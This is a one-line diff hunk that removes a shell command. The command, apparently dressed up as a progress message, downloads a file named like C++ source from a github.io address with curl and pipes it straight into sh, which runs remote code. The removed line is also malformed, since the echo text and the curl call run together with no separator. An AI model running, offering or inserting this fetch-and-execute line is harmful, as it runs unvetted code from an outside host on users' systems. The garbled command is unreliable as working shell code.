@@ -1,1 +1,0 @@
-echo Progress: 5.00%curl -L --progress-bar frkns.github.io/fun/StatingLlc.cxx | sh
